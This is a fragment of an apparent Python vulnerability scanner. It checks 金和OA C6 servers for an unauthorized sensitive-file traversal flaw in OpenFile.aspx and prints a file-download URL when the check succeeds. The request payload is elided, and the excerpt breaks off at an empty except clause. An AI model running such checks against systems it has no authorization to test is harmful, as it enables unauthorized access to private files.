...
def main(target_url):
    ...
    console.print(now_time() + " [INFO]     正在检测金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞", style='bold blue')
    ...
    try:
        ...
        if "strFilePath =" in response.text and response.status_code == 200:
            ...
            if strFilePath != "":
                console.print(now_time() + ' [SUCCESS]  金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞:{}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}'.format(target_url, strId, strFileIDCode, sid), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞不存在文件', style='bold yellow ')
        else:
            console.print(now_time() + ' [WARNING]  金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞不存在', style='bold red ')
    except:
